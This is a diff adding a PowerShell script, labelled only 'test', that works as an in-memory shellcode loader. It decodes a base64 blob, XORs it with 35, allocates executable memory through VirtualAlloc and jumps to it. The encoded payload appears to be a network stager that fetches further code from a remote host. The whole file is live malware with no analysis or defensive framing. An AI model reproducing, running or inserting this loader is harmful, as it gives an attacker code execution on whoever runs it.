@@ -1,0 +1,37 @@
+test
+Set-StrictMode -Version 2
+
+function func1 {
+	Param ($param1, $param2)		
+	$var1 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$var2 = $var1.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $var2.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var1.GetMethod('GetModuleHandle')).Invoke($null, @($param1)))), $param2))
+}
+
+function func2 {
+	Param (
+		[Parameter(Position = 0)] [Type[]] $param3,
+		[Parameter(Position = 1)] [Type] $param4 = [Void]
+	)
+
+	$var3 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$var3.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $param3).SetImplementationFlags('Runtime, Managed')
+	$var3.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $param4, $param3).SetImplementationFlags('Runtime, Managed')
+
+	return $var3.CreateType()
+}
+
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$var4 = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim4COIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDEV1cWwjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBiN2UEZRDmJERk1XGQNuTFlKT09CDBcNEwMLQExOU0JXSkFPRhgDbnBqZgMbDRMYA3RKTUdMVFADbXcDFQ0TCi4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnAjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3G5CWVlKTE0SERAXDhcXFxYSDVNMUVdOQlMNS0xQVyMjIyMj')
+
+	for ($var5 = 0; $var5 -lt $var4.Count; $var5++) {
+		$var4[$var5] = $var4[$var5] -bxor 35
+	}
+
+	$var6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func1 kernel32.dll VirtualAlloc), (func2 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+	$var7 = $var6.Invoke([IntPtr]::Zero, $var4.Length, 0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($var4, 0, $var7, $var4.length)
+
+	$var8 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var7, (func2 @([IntPtr]) ([Void])))
+	$var8.Invoke([IntPtr]::Zero)
+}
